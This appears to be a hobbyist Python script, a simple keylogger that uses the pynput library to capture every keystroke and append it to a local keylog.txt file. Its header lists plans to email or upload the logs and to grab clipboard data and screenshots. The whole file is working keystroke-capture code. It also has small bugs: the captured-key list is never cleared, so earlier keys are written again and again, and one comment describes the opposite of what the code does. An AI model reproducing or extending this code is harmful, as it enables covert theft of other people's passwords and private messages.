# Cole Hoover
# 6/28/22
# Simple Keylogger
# Current Features: Log keys, write to text file, formatting
# Features to add: Email logs, upload logs to website, log clipboard data, take screenshots

# Import pynput library to get access to keystrokes
import pynput

# Import Key to get keys not represented by numbers/letters and Listener to listen to the keyboard
from pynput.keyboard import Key, Listener

# Global variables to help with wiring to file
count = 0
keys = []


# Function to obtain keystroke when key is pressed
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)
    if count >= 25: # After 25 keystrokes, reset counter and write to file
        count = 0
        write_to_log(keys)


# Function to write logged keys to text file and format it
def write_to_log(keys):
    with open("keylog.txt", "a") as f:
        f.write("\n")
        for key in keys:
            k = str(key).replace("'", "")  # Deletes quotation marks
            if key == Key.space:
                f.write('\n')  # If space key pressed write new line in log file
            elif k.find("Key") == -1:
                f.write(k)  # Only write the key if non-alphanumeric


# Function to exit program if escape is pressed
def on_release(key):
    if key == Key.esc:
        return False


# Function to liseten to the keyboard until it is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
